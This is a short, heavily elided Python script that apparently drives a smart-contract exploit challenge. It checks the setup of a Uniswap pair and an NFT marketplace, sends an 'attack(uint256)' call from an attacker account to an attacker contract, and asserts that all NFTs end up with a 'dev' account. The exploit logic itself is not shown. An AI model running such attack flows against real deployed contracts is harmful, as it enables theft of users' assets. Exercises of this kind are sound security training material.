...
def main():
    ...
    assert uni_pair.token0() == weth
    assert uni_pair.token1() == token
    ...
    for id in range(AMOUNT_OF_NFTS):
        assert nft.ownerOf(id) == deployer

    nft.setApprovalForAll(marketplace, True, sender=deployer)
    ...
    calldata = get_sig("attack(uint256)") + encode(["uint256"], [NFT_PRICE]).hex()

    send_tx(attacker, attacker_contract, calldata)
    ...
    for tokenId in range(AMOUNT_OF_NFTS):
        ...
        assert nft.ownerOf(tokenId) == dev
